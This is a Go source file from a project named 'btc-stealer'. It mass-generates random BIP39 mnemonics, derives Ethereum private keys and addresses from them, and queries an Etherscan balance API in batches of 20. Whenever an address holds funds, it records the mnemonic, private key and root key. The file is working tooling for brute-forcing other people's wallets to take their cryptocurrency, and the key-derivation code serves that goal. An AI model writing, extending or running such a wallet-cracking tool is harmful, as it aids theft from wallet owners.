package eth

import (
	"btc-stealer/common"
	"btc-stealer/data"
	"encoding/hex"
	"fmt"
	"log"
	"strconv"
	"strings"

	"github.com/btcsuite/btcd/btcec/v2"
	"golang.org/x/crypto/sha3"
)

type EtherScanAcc struct {
	Account string `json:"account"`
	Balance string `json:"balance"`
}

type EtherScanResp struct {
	Status  string         `json:"status"`
	Message string         `json:"message"`
	Result  []EtherScanAcc `json:"result"`
}

func balanceChecker(addr ...string) map[string]float64 {
	uri := common.GetETHScanAPIAddress() + strings.Join(addr, ",")

	var resp EtherScanResp

	common.HttpGetRequest(uri, &resp)

	has := make(map[string]float64)
	for _, acc := range resp.Result {
		v, _ := strconv.ParseFloat(acc.Balance, 64)

		has[acc.Account] = v / 10e17
	}

	return has
}

// encodeEthereum encodes the private key and address for Ethereum.
func encodeEthereum(privateKeyBytes []byte) (privateKey, address string) {
	_, pubKey := btcec.PrivKeyFromBytes(privateKeyBytes)

	publicKey := pubKey.ToECDSA()
	publicKeyBytes := append(publicKey.X.Bytes(), publicKey.Y.Bytes()...)

	// Ethereum uses the last 20 bytes of the keccak256 hash of the public key
	hash := sha3.NewLegacyKeccak256()
	hash.Write(publicKeyBytes)
	addr := hash.Sum(nil)
	addr = addr[len(addr)-20:]

	return hex.EncodeToString(privateKeyBytes), eip55checksum(fmt.Sprintf("0x%x", addr))
}

// eip55checksum implements the EIP55 checksum address encoding.
// this function is copied from the go-ethereum library: go-ethereum/common/types.go checksumHex method
func eip55checksum(address string) string {
	buf := []byte(address)
	sha := sha3.NewLegacyKeccak256()
	sha.Write(buf[2:])
	hash := sha.Sum(nil)
	for i := 2; i < len(buf); i++ {
		hashByte := hash[(i-2)/2]
		if i%2 == 0 {
			hashByte = hashByte >> 4
		} else {
			hashByte &= 0xf
		}
		if buf[i] > '9' && hashByte > 7 {
			buf[i] -= 32
		}
	}
	return string(buf[:])
}

func AddressGenETH(bitSize int) {
	coins := make(map[string]*data.Eth)

	var addrs []string
	for i := 0; i < 20; i++ {
		coin := AddressGenETHMaster(bitSize, common.Mnemonic(bitSize), "")

		coins[coin.Address] = coin
		addrs = append(addrs, coin.Address)
	}

	checker := balanceChecker(addrs...)

	for _, coin := range coins {
		balance, ok := checker[coin.Address]
		if ok && balance > 0 {
			common.RecordBalance(coin.RecordString())

			continue
		}
		common.RecordNoBalance(coin.RecordString())
	}
}

func AddressGenETHMaster(bitSize int, mnemonic, passphrase string) *data.Eth {
	km, err := common.NewKeyManager(bitSize, passphrase, mnemonic)
	if err != nil {
		log.Fatal(err)
	}

	masterKey, err := km.GetMasterKey()
	if err != nil {
		log.Fatal(err)
	}

	key, err := km.GetKey(common.PurposeBIP44, common.CoinTypeETH, 0, 0, 0)
	if err != nil {
		log.Fatal(err)
	}

	privateKey, address := encodeEthereum(key.Bip32Key.Key)

	return &data.Eth{
		Address:    address,
		Mnemonic:   mnemonic,
		PrivateKey: privateKey,
		RootKey:    masterKey.B58Serialize(),
	}
}

func AddressGenETHMasterAndSub(bitSize int, mnemonic, passphrase string) map[string]*data.Eth {
	km, err := common.NewKeyManager(bitSize, passphrase, mnemonic)
	if err != nil {
		log.Fatal(err)
	}

	masterKey, err := km.GetMasterKey()
	if err != nil {
		log.Fatal(err)
	}

	rk := masterKey.B58Serialize()

	coins := make(map[string]*data.Eth)

	var addrs []string
	for i := 0; i < 4; i++ {
		key, err := km.GetKey(common.PurposeBIP44, common.CoinTypeETH, 0, 0, uint32(i))
		if err != nil {
			log.Fatal(err)
		}

		privateKey, address := encodeEthereum(key.Bip32Key.Key)

		addrs = append(addrs, address)

		coins[address] = &data.Eth{
			RootKey:    rk,
			Address:    address,
			Mnemonic:   mnemonic,
			PrivateKey: privateKey,
		}
	}

	return coins
}
